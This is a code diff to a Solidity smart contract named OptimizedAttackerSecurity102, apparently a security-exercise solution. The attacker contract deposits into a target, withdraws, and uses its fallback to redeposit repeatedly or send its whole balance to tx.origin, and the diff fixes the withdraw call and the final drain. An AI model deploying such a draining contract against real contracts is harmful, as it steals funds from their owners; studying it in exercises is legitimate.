@@ -36,12 +36,12 @@ contract OptimizedAttackerSecurity102 {
 
     function attack(Target target) external payable {
         target.deposit{ value: msg.value }();
-        target.withdraw(msg.value ether);
+        target.withdraw(msg.value);
     }
 
     fallback() external payable {
         if (msg.value > 8192 ether){
-            payable(tx.origin).transfer(10001 ether);
+            payable(tx.origin).transfer(address(this).balance);
         }else{
             Target(msg.sender).deposit{ value: msg.value }();
             if (msg.value * 2 > 8192 ether)
